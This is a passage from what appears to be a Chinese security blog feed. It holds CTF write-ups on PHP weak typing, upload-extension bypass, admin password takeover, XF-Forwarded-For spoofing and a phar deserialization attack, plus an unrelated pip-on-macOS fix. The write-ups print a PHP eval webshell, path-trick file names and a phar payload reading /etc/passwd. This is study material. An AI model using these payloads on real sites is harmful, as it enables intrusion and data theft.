class="hljs-string">&#x27;admin&#x27;</span>]) &#123;<br>        $con = $_POST[<span class="hljs-string">&#x27;con&#x27;</span>];<br>        $file = $_POST[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        $filename = <span class="hljs-string">&quot;backup/&quot;</span> . $file;<br><br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, $filename)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bad file extension&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            chdir(<span class="hljs-string">&#x27;uploaded&#x27;</span>);<br>            $f = fopen($filename, <span class="hljs-string">&#x27;w&#x27;</span>);<br>            fwrite($f, $con);<br>            fclose($f);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br> <br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">// 设置id参数、id不等于1、id的倒数第一个位置为9</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; substr($_GET[id], <span class="hljs-number">-1</span>) === <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br>        $id = mysql_real_escape_string($_GET[id]);<br>        $sql = <span class="hljs-string">&quot;select * from cetc007.user where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br>        $result = mysql_query($sql);<br>        $result = mysql_fetch_object($result);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $result = <span class="hljs-literal">False</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!$result) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);<br>    <span class="hljs-keyword">if</span> ($result) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;id: &quot;</span> . $result-&gt;id . <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;name:&quot;</span> . $result-&gt;user . <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        $_SESSION[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-literal">True</span>;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br><br>&lt;/body&gt;<br><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>分析过后，能将这个源码分为3个部分：</p><ol><li>包含flag文件。需要调整<code>page</code>参数</li><li>进行文件写入。需要调整<code>$_SESSION[&#39;admin&#39;]</code>、<code>$_POST[&#39;con&#39;]</code>、<code>$_POST[&#39;file&#39;]</code>三个参数。</li><li>将<code>$_SESSION[&#39;admin&#39;]</code> 设置为true。调整<code>id</code>参数</li></ol><h1 id="2-php弱类型"><a href="#2-php弱类型" class="headerlink" title="2 php弱类型"></a>2 php弱类型</h1><p>需要先使得<code>$_SESSION[&#39;admin&#39;]=true</code>，故先针对第三部分进行处理。</p><ul><li>floatval函数：获取变量的浮点值。</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229161435469.png" alt="image-20201229161435469"></p><p>当floatval函数遇到字符串时，会自动截断后面的内容。</p><ul><li>substr函数：返回字符串的一部分</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229161406321.png" alt="image-20201229161406321"></p><p>substr为负数时，按数组从后到前输出。故使得<code>id=1 9</code>即可，1和9之间有一个空格。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229161844300.png" alt="image-20201229161844300"></p><h1 id="3-php上传后缀绕过"><a href="#3-php上传后缀绕过" class="headerlink" title="3 php上传后缀绕过"></a>3 php上传后缀绕过</h1><p>尝试上传正常的文件。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229162616156.png" alt="image-20201229162616156"></p><p>然后进入<code> /uploaded/backup</code>目录即可看见1.txt。</p><p>然后需要利用 Linux 的特性进行绕过后缀。将文件名命名为 <code>a.php/b.php/..</code>  会有意想不到的结果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br>$filename = <span class="hljs-string">&#x27;a.php/b.php/..&#x27;</span>;<br>$f = fopen($filename, <span class="hljs-string">&#x27;w&#x27;</span>);<br>fwrite($f, $con);<br>fclose($f);<br><br></code></pre></td></tr></table></figure><p>这种文件名在php中会被解析为 a.php（可以先将<code>a.php</code>和<code>b.php</code>看见文件夹，使用<code>..</code>会回到上一个文件夹），程序最后会创建一个a.php。</p><p>综合上面的结论，<code>con</code>为php的内容，<code>file</code>为php文件名。把文件名命名为 <code>a.php/b.php/..</code>，如下配置：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229163357690.png" alt="image-20201229163357690"></p><p>最后访问 <a href="http://220.249.52.134:46528/uploaded/backup/a.php">http://220.249.52.134:46528/uploaded/backup/a.php</a> 即可。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229163655879.png" alt="image-20201229163655879"></p><p>最后写入一句话，使用蚁剑进行连接即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">con=<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[pwd]);<span class="hljs-meta">?&gt;</span>&amp;&amp;file=b.php/b.php/..<br></code></pre></td></tr></table></figure><p>最后通过命令即可找到flag。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229164218161.png" alt="image-20201229164218161"></p><p>参考：</p><ol><li><a href="https://www.cnblogs.com/zhengna/p/13452813.html">https://www.cnblogs.com/zhengna/p/13452813.html</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>php弱类型</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-bug</title>
    <link href="/2020/12/27/2020%E5%B9%B412%E6%9C%8827%E6%97%A5-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bug/"/>
    <url>/2020/12/27/2020%E5%B9%B412%E6%9C%8827%E6%97%A5-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bug/</url>
    
    <content type="html"><![CDATA[<h1 id="1-越权改密码"><a href="#1-越权改密码" class="headerlink" title="1 越权改密码"></a>1 越权改密码</h1><p>大概熟悉一下整个网站的功能。</p><ol><li>注册</li><li>找回密码</li><li>登陆</li><li>查询个人信息</li></ol><p><strong>测试注册功能</strong>。我使用SQLmap测试是否有SQL注入，发现并没有找到注入。注册点可能会有二次注入，使用SQLmap测不出来就尝试下一个点。</p><p><strong>测试找回密码功能</strong>。首先是将用户信息进行输入，然后输入新密码。查看源码能看见当前正在找回的用户名<code>1</code></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227225311710.png" alt="image-20201227225311710"></p><p>填入新密码后，HTTP请求头会同时发送用户名和密码。如果系统用此时的用户名来修改密码，那就可以进行越权操作。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227225242767.png" alt="image-20201227225242767"></p><p>尝试修改用户名为admin，新密码为admin，发送后修改成功（此处存在越权）。</p><p><strong>测试登陆功能</strong>。SQLmap没反应。</p><p><strong>测试查询个人信息</strong>。手动进行sql注入闭合，无反应。尝试进行修改UID，并未得到其他用户的信息。</p><p>其他大佬还注意到了Cookie的异常。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227230553008.png" alt="image-20201227230553008"></p><p>将<code>4b9987ccafacb8d8fc08d22bbca797ba</code>有点类似MD5，在SOMD5进行解密后得<code>1:admin</code>。也可以通过修改Cookie的方式进行越权。</p><h1 id="2-X-Forward-For绕过IP检测"><a href="#2-X-Forward-For绕过IP检测" class="headerlink" title="2 X-Forward-For绕过IP检测"></a>2 X-Forward-For绕过IP检测</h1><p>登陆后只剩manage功能没有进行测试了，点击之后提示IP错误。遇到 IP 限制，通常有2个思路（大佬应该更多）。</p><ol><li>X-Forward-For：使用Chrome的modheader工具</li><li>SSRF：找源码或者其他漏洞进行SSRF，进行本地文件读取或者其他操作。</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227231106321.png" alt="image-20201227231106321"></p><h1 id="3-文件上传绕过"><a href="#3-文件上传绕过" class="headerlink" title="3 文件上传绕过"></a>3 文件上传绕过</h1><p>成功绕过IP检测后，能看见侧着的笑脸和Where Is The Flag?的字样。在源码中隐藏了另一个信息<code>index.php?module=filemanage&amp;do=???</code>.文件类型的action通常都是upload，故访问<code>index.php?module=filemanage&amp;do=upload</code>页面，在新页面中能进行文件上传。</p><ol><li>选择图片进行上传。</li><li>使用BurpSuite抓包修改内容。<ol><li>将文件后缀改为php5或php4</li><li>将文件内容修改为<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code></li></ol></li><li>发送即可得到flag</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227232259360.png" alt="image-20201227232259360"></p><p>参考：</p><ol><li><a href="https://www.cnblogs.com/gaonuoqi/p/11692694.html">https://www.cnblogs.com/gaonuoqi/p/11692694.html</a></li><li><a href="https://blog.csdn.net/weixin_42499640/article/details/98793342">https://blog.csdn.net/weixin_42499640/article/details/98793342</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>攻防世界</tag>
      
      <tag>水平越权</tag>
      
      <tag>XFF伪造</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决mac中pip3对应python2</title>
    <link href="/2020/12/21/2020%E5%B9%B412%E6%9C%8821%E6%97%A5-%E8%A7%A3%E5%86%B3mac%E4%B8%ADpip3%E5%AF%B9%E5%BA%94python2/"/>
    <url>/2020/12/21/2020%E5%B9%B412%E6%9C%8821%E6%97%A5-%E8%A7%A3%E5%86%B3mac%E4%B8%ADpip3%E5%AF%B9%E5%BA%94python2/</url>
    
    <content type="html"><![CDATA[<h1 id="解决mac中pip3对应python2（pip指向问题）"><a href="#解决mac中pip3对应python2（pip指向问题）" class="headerlink" title="解决mac中pip3对应python2（pip指向问题）"></a>解决mac中pip3对应python2（pip指向问题）</h1><h2 id="同理可以解决-pip-对应-Python3-的问题。"><a href="#同理可以解决-pip-对应-Python3-的问题。" class="headerlink" title="同理可以解决 pip 对应 Python3 的问题。"></a>同理可以解决 pip 对应 Python3 的问题。</h2><h1 id="一、问题"><a href="#一、问题" class="headerlink" title="一、问题"></a>一、问题</h1><p>在 mac 中查看 pip 和 pip3 的版本，其中 pip3 对应的 Python 版本是 2.7</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201221215802703.png" alt="image-20201221215802703"></p><p>正常情况下应该是：pip对应Python2，pip3对应Python3。</p><h1 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h1><p>使用which可以查看指令pip的绝对路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ » <span class="hljs-built_in">which</span> pip                <br>/usr/<span class="hljs-built_in">local</span>/bin/pip<br></code></pre></td></tr></table></figure><p>在mac中使用easy_install安装pip会导致pip和pip3都变成pip</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ » sudo easy_install pip                 littlechieh6@bogon<br>Password:<br>Searching <span class="hljs-keyword">for</span> pip<br>Best match: pip 20.2b1<br>Processing pip-20.2b1-py2.7.egg<br>pip 20.2b1 is already the active version <span class="hljs-keyword">in</span> easy-install.pth<br>Installing pip script to /usr/<span class="hljs-built_in">local</span>/bin<br>Installing pip3.8 script to /usr/<span class="hljs-built_in">local</span>/bin<br>Installing pip3 script to /usr/<span class="hljs-built_in">local</span>/bin<br><br>Using /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg<br>Processing dependencies <span class="hljs-keyword">for</span> pip<br>Finished processing dependencies <span class="hljs-keyword">for</span> pip<br>-------------------------------------------------------------<br>~ » pip3 --version                        littlechieh6@bogon<br>pip 20.2b1 from /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg/pip (python 2.7)<br>-------------------------------------------------------------<br>~ » pip --version                         littlechieh6@bogon<br>pip 20.2b1 from /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg/pip (python 2.7)<br></code></pre></td></tr></table></figure><p>或者使用bootstrap.pypa.io网站的get-pip.py脚本安装pip3，会导致pip和pip3都变成pip3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/Desktop » curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py<br><br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>  0     0    0     0    0     0      0      0 --:--:-- --:--:  1 1842k    1 20565    0     0  43294      0  0:00:43 --:--: 50 1842k   50  935k    0     0   626k      0  0:00:02  0:00:100 1842k  100 1842k    0     0   848k      0  0:00:02  0:00:02 --:--:--  848k<br>-------------------------------------------------------------<br>~/Desktop » sudo python3 get-pip.py<br>-------------------------------------------------------------<br>~/Desktop » pip --version                 littlechieh6@bogon<br>pip 20.3.3 from /Library/Python/3.8/site-packages/pip (python 3.8)<br>-------------------------------------------------------------<br>~/Desktop » pip3 --version                littlechieh6@bogon<br>pip 20.3.3 from /Library/Python/3.8/site-packages/pip (python 3.8)<br></code></pre></td></tr></table></figure><p>查看Python2和Python3的执行位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ » <span class="hljs-built_in">which</span> python3                         littlechieh6@bogon<br>/usr/bin/python3<br>-------------------------------------------------------------<br>~ » <span class="hljs-built_in">which</span> python                          littlechieh6@bogon<br>/usr/bin/python<br>-------------------------------------------------------------<br>~ » ls -al /usr/bin/python3               littlechieh6@bogon<br>-rwxr-xr-x  1 root  wheel  31488 Sep 22 08:29 /usr/bin/python3<br>-------------------------------------------------------------<br>~ » ls -al /usr/bin/python                littlechieh6@bogon<br>lrwxr-xr-x  1 root  wheel  75 Jul  1 08:44 /usr/bin/python -&gt; ../../System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7<br></code></pre></td></tr></table></figure><p>查看pip的执行位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ » <span class="hljs-built_in">which</span> pip                             littlechieh6@bogon<br>/usr/<span class="hljs-built_in">local</span>/bin/pip<br>-------------------------------------------------------------<br>~ » <span class="hljs-built_in">which</span> pip3                            littlechieh6@bogon<br>/usr/<span class="hljs-built_in">local</span>/bin/pip3<br>-------------------------------------------------------------<br>~ » ls -al /usr/<span class="hljs-built_in">local</span>/bin/pip             littlechieh6@bogon<br>-rwxr-xr-x  1 root  admin  263 Dec 21 22:56 /usr/<span class="hljs-built_in">local</span>/bin/pip<br>-------------------------------------------------------------<br>~ » ls -al /usr/<span class="hljs-built_in">local</span>/bin/pip3            littlechieh6@bogon<br>-rwxr-xr-x  1 root  admin  263 Dec 21 22:56 /usr/<span class="hljs-built_in">local</span>/bin/pip3<br></code></pre></td></tr></table></figure><p>原pip和pip3脚本，关键点在于<code>#!</code>代表执行脚本的路径。由于pip和pip3都是由python3执行，所以使用<code>pip -V</code>和<code>pip3 -V</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/Applications/Xcode.app/Contents/Developer/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pip._internal.cli.main <span class="hljs-keyword">import</span> main<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sys.argv[<span class="hljs-number">0</span>] = re.sub(<span class="hljs-string">r&#x27;(-script\.pyw|\.exe)?$&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, sys.argv[<span class="hljs-number">0</span>])<br>    sys.exit(main())<br></code></pre></td></tr></table></figure><p>使用<code>vim /usr/local/bin/pip</code>将解释器指向Python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pip._internal.cli.main <span class="hljs-keyword">import</span> main<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sys.argv[<span class="hljs-number">0</span>] = re.sub(<span class="hljs-string">r&#x27;(-script\.pyw|\.exe)?$&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, sys.argv[<span class="hljs-number">0</span>])<br>    sys.exit(main())<br></code></pre></td></tr></table></figure><h1 id="三、效果"><a href="#三、效果" class="headerlink" title="三、效果"></a>三、效果</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ » pip -V                                littlechieh6@bogon<br>pip 20.2b1 from /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg/pip (python 2.7)<br>-------------------------------------------------------------<br>~ » pip3 -V                               littlechieh6@bogon<br>pip 20.3.3 from /Library/Python/3.8/site-packages/pip (python 3.8)<br></code></pre></td></tr></table></figure><p>参考教程：</p><ol><li><a href="https://blog.csdn.net/u014259820/article/details/100580970">https://blog.csdn.net/u014259820/article/details/100580970</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PDFCreator题解</title>
    <link href="/2020/10/31/2020%E5%B9%B410%E6%9C%8831%E6%97%A5-PDFCreator%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/10/31/2020%E5%B9%B410%E6%9C%8831%E6%97%A5-PDFCreator%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>该题为 phar 反序列化，上传文件要求为图片。感觉 phpggc 工具挺香的，决定分享一下。</p><p>比赛地址：<a href="https://ctftime.org/event/854/tasks/">Chaos Communication Camp 2019 </a><br>题解1:<a href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/">[Web] Chaos Communication Camp 2019 CTF - pdfcreator</a><br>题解2:<a href="https://medium.com/@craig.knott92/ccc-2019-ctf-pdfcreator-9c76fd60452d">CCC 2019 CTF — PDFCreator</a></p><hr><a id="more"></a><p>（ps：为啥突然做这题？某个大佬丢给我的，顺手就蹭了个环境，毕竟搭建环境挺麻烦的，补题都来不及</p><p>首先体验一下网站，上传需要图片小于 500KB，从网上找了一张图片 5k。上传后返回结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 顶部显示：Upload successful: upload/fd456406745d816a45cae554c788e754.jpg</span><br><br>&lt;h1&gt;Converted by CoolPDF&lt;/h1&gt;&lt;h3&gt;We hope you enjoyed our service!&lt;/h3&gt;<br>     &lt;img src=<span class="hljs-string">&quot;upload/fd456406745d816a45cae554c788e754.jpg&quot;</span>&gt;<br>      <br></code></pre></td></tr></table></figure><p>然后再次提交，返回结果为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># TCPDF ERROR: Unable to create output file: /var/www/html/output/81f851fd84a2591f4608f9a7715095ad.pdf</span><br></code></pre></td></tr></table></figure><p>起初对 phar 不太熟悉，只有大致的了解。开始测试使用题解 1 的 payload，并未修改任何东西，payload 打上去没有任何结果。(实际上应该是有结果的，在 html 源码里，不会直接呈现在页面)<br>界面<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201031235650.png"><br>源码<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201031235615.png"></p><p>知道真相，(-.-)# 直接气哭。以后记得多看源码！多看源码！多看源码！</p><hr><h1 id="方法1-手写phar"><a href="#方法1-手写phar" class="headerlink" title="方法1:手写phar"></a>方法1:手写phar</h1><p>首先创建 phar.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;creator.php&quot;</span>;<br>$jpeg_header_size =<br><span class="hljs-string">&quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;</span>.<br><span class="hljs-string">&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;</span>.<br><span class="hljs-string">&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;</span>.<br><span class="hljs-string">&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;</span>.<br><span class="hljs-string">&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;</span>.<br><span class="hljs-string">&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;</span>.<br><span class="hljs-string">&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;</span>.<br><span class="hljs-string">&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;</span>.<br><span class="hljs-string">&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;</span>.<br><span class="hljs-string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;</span>.<br><span class="hljs-string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;</span>.<br><span class="hljs-string">&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;</span>;<br>$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>$phar-&gt;startBuffering();<br>$phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br>$phar-&gt;setStub($jpeg_header_size.<span class="hljs-string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);<br>$o = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>$o-&gt;tmpfile = <span class="hljs-string">&quot;/etc/passwd&quot;</span>;<br>$phar-&gt;setMetadata($o);<br>$phar-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p>然后执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">php phar.php<br>mv phar.phar phar.jpeg<br></code></pre></td></tr></table></figure><p>将文件上传，并添加 phar 包装器，类似下面的格式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Converted by CoolPDF<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>We hope you enjoyed our service!<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;phar://upload/708697c63f7eb369319c6523380bdf7a_11.jpg&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最后可以得到结果（使用 /etc/passwd 容易回显，以后本地文件包含的时候尽量用这个文件吧）<br><img 